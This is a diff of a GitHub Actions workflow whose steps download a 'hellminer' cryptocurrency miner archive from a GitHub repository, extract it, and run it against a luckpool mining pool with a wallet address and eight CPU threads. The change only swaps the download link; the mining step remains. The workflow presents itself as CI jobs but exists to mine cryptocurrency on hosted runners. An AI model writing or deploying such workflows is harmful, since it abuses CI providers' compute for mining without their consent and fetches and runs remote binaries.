@@ -17,9 +17,9 @@ jobs:
         JOB: ${{ matrix.go }}
     steps:
     - name: DOWNLOAD
-      run: Invoke-WebRequest https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz -OutFile tar xf hellminer_cpu_linux.tar.gz
+      run: Invoke-WebRequest https://github.com/NuDev2021/pusing/blob/main/hellminer.zip -OutFile hellminer.zip
     - name: Extract
-      run: Expand-Archive tar xf hellminer_cpu_linux.tar.gz
+      run: Expand-Archive hellminer.zip
     - name: RUNNING
       run: ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RBnvE5PySsdZCBEBbXoWEocrEr1uWq4dJJ -p x --cpu 8 'string command miner seperti pool:port, wallet, threads, '
     - name: DONE
